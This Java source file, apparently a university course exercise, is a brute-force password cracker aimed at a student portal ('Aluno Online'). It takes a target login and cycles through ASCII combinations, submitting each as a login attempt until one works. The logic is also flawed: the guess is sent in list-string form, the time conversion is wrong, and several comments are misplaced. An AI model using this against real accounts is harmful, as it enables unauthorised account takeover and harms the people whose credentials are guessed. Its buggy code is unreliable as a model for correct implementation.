package br.iesb.teoria;

import java.io.FileWriter;
import java.io.PrintWriter;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;
import java.util.Scanner;

/**
 * Class ForcaBruta.
 */
public class ForcaBruta {

    /** Atributo que indica o tamanho da senha a ser testada. */
    private static int N = 1;

    /** Atributo que será usado para indicar o tempo inicial. */
    private static double initialTime;

    /**
     * Atributo que será usado para indicar o tempo que o programa crack levou
     * para descobrir a senha.
     */
    private static double interval;

    /** Atributo usado para indicar o login do usuário. */
    private static String usuario;

    /**
     * O método main.
     *
     * @param args
     *            os argumentos
     * @throws Exception
     *             the exception
     */
    public static void main(String[] args) throws Exception {

	// Cria-se um novo arquivo para registrar a senha descoberta e o tempo
	// que o algoritmo rodou.
	FileWriter arq = new FileWriter(System.getProperty("user.dir") + "/src/br/iesb/teoria/resultados.txt", true);
	PrintWriter gravarArq = new PrintWriter(arq);

	// É solicitado ao usuário que digite o login do aluno online
	Scanner sc = new Scanner(System.in);
	System.out.println("Login do Aluno Online: ");
	usuario = sc.next();

	// Define o instante inicial antes de craquear a senha
	initialTime = System.currentTimeMillis();

	// Chama o método crack que utiliza o método da força bruta para
	// descobrir a senha
	crack();

	// Define o tempo total que o programa levou para descobrir a senha
	interval = System.currentTimeMillis() - initialTime;
	System.out.println("Tempo(seg): " + interval / 1000);

	// Registra o tempo no arquivo criado
	gravarArq.println("Tempo(horas): " + ((interval / 1000) / 60) / 24);
	arq.close();
	sc.close();
    }

    /**
     * Crack → Utiliza o método da força bruta para descobrir a senha.
     */
    private static void crack() {

	// Variável para indicar a posição do caracter que será incrementado
	Integer i;

	// Lista de caracter para armazenar a senha.
	List<Character> bam = new ArrayList<Character>();

	// Inicia a lista com o 1° caracter como vazio
	bam.add((char) 31);
	do {
	    i = 0;

	    // Seleciona o próximo caracter da tabela ASCII na posição 0
	    nextChar(bam, i); // bam[i]++

	    // Enquanto o caracter da posição i não for o último da tabela ASCII
	    // e essa posição for menor que o tamanho da senha a ser testada
	    // (bam), ...
	    while ((bam.get(i) == (char) 255) && (i < N)) {

		// testa se o último caracter da variável bam é o último da
		// tabela ASCII.
		if (bam.get(N++ - 1) == (char) 255)
		    bam.add((char) 31);

		// Além disso, coloca o caracter 32 da tabela
		// ASCII em bam na
		// posição i e incrementa-o
		bam.set(i++, (char) 32);

		// Se for, bam aumenta de tamanho adicionando um
		// caracter vazio (31).
		nextChar(bam, i);
	    }
	    // Só então tenta fazer o login no sítio do aluno online, passando
	    // como parâmetro login e senha
	} while (!Navegador.start(Arrays.asList(usuario, bam.toString())));
	System.out.println(bam);
    }

    /**
     * Seleciona o próximo caracter.
     *
     * @param bam
     *            a senha temporária
     * @param i
     *            a posição do caracter
     */
    private static void nextChar(List<Character> bam, Integer i) {
	char temp = 0;
	temp = Character.valueOf(bam.get(i));
	temp = (char) (temp + 1);
	bam.set(i, temp);
    }

}
